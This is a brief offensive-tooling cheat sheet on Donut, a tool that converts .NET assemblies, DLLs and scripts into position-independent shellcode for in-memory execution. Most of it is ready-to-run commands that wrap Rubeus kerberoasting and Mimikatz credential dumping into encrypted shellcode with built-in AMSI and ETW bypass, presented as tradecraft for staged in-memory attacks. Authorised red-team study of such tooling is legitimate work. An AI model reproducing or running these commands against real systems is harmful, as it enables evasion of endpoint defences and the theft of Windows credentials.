# 06.01 Donut

> Convert any .NET assembly, DLL, EXE, JScript, VBScript into position-independent shellcode for in-memory execution.

## Overview

Donut takes a managed/native binary or script and outputs raw shellcode that loads it in-process. Built-in AMSI/ETW patching, encryption (default AES, randomized per build), optional compression. The output `.bin` drops directly into any shellcode runner (C#, Nim, Go, BOF). Critical for staged in-memory tradecraft.

## Steps

- **Step 1** - Build from source.
- **Step 2** - Run donut against your input.
- **Step 3** - Embed the output shellcode in your runner.

## Commands

### Install

```bash
git clone https://github.com/TheWover/donut
cd donut && make
```

### .NET assembly to shellcode

```bash
./donut -f 1 -i Rubeus.exe -p 'kerberoast /outfile:roast.txt' -o rubeus_sc.bin -b 3 -z 2
# Flags:
#  -f 1     raw shellcode
#  -b 3     AMSI + ETW bypass
#  -z 2     apack compression
#  -e 1     AES encrypt (default key, randomized)
```

### Native DLL

```bash
./donut -f 1 -i mimikatz.dll -m DumpCreds -o mimikatz_sc.bin -b 3 -z 2
```

### PowerShell script

```bash
./donut -f 1 -i Invoke-Mimikatz.ps1 -o ps_sc.bin -b 3
```

### Output formats

```bash
./donut -f 2 -i Rubeus.exe -o rubeus.b64  # base64
./donut -f 3 -i Rubeus.exe -o rubeus.c    # C array
```
